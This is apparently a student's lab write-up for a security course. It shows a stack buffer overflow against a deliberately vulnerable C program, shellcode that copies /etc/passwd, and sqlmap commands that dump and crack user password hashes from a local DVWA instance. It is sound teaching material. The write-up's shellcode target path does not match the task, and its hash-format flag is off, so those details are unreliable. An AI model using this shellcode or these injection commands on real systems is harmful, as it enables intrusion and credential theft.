# Lab #1,22119054, Luu Trong Dung, INSE331280E_01FIE
# Task 1: Software buffer overflow attack
**Question 1**: 
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
  

**Answer 1**:
## 1. Create a text file named `bof.c`:
```sh
#include <stdio.h>
#include <string.h>
void redundant_code(char *p)
{
    char local[256];
    strncpy(local, p, 20);
    printf("redundant code\n");
}
int main(int argc, char *argv[])
{
    char buffer[16];
    strcpy(buffer, argv[1]);
    return 0;
}
```

## 2. Create a text file named `shellcode.asm`:
```sh
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80
```

## 3.Compile asm program and C program to executable code. 
Step 1: First compile the code
before compile must run docker
```sh
docker run -it --privileged -v 'E:\Learn\Secure\KT:/home/seed/seclabs' securelabs
```
compile C program
```sh
gcc -g bof.c -o bof.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
```
Compile asm program 
```sh
nasm -f elf32 shellcode.asm -o shellcode.o
```
linking asm
```sh
ld -o shellcode shellcode.o
```
## 4.Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 

Step2: insert the compiled file bof.out into gdb to see the address of the redundant_code() function and record the address
```sh
gdb -q bof.out
```
save address of redundant_code: 0x0804846b
```sh
disas redundant_code
```
![](./images/Screenshot%202024-10-21%20083428.png)


Step 3: Exit the GDB and start the attack by inserting the address of the function that was saved in the upper step of Return.
```sh
./bof.out $(python -c "print('a'*20 + '\x6b\x84\x04\x08')")
```

output screenshot (optional)
![](./images/Screenshot%202024-10-21%20084105.png)


# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 
  
## Setup
Step1: Install dvwa and sqlmap

Install dvwa
```sh
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```
Install sqlmap
```sh
sudo apt update
sudo apt install sqlmap
```

Step2: next to the browser, type in the URL bar "localhost:80" and log in with (Admin, password)
![](./images/Screenshot%202024-10-21%20094110.png)

Step3: then select sql injection and fill in 1 user ID of any submit, then copy URl 
![](./images/Screenshot%202024-10-21%20094223.png)

Step4: next press f12 to find and save Cockie
![](./images/Screenshot%202024-10-21%20094329.png)

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**: This command includes the URL and cookie saved in the Setup steps
```sh
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=j1jkcruu09uddv6q2jbbc7a125; security=low" --dbs
```

![](./images/Screenshot%202024-10-21%20094903.png)

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**: The figure below contains 2 tables in the DVWA database, User and Guestbook
use sqlmap to get tables 
```sh
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=j1jkcruu09uddv6q2jbbc7a125; security=low" --dbs --tables
```
![](./images/Screenshot%202024-10-21%20095522.png)

use sqlmap to get infomation of users table in database dvwa
```sh
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=j1jkcruu09uddv6q2jbbc7a125; security=low" -D dvwa -T users --columns
```
![](./images/Screenshot%202024-10-21%20100555.png)


**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:

```sh
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=j1jkcruu09uddv6q2jbbc7a125; security=low" -D dvwa -T users --dump   
```
With the above command we get the data in the users table
![](./images/Screenshot%202024-10-21%20102134.png)

Retrieve the hashed password of any user
```sh
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
```

Install John
```sh
sudo apt update
sudo apt install john -y
```

Use John decrypt hashes password save in hashes.txt, with format=md5
```sh
john --format=md5crypt hashes.txt
```

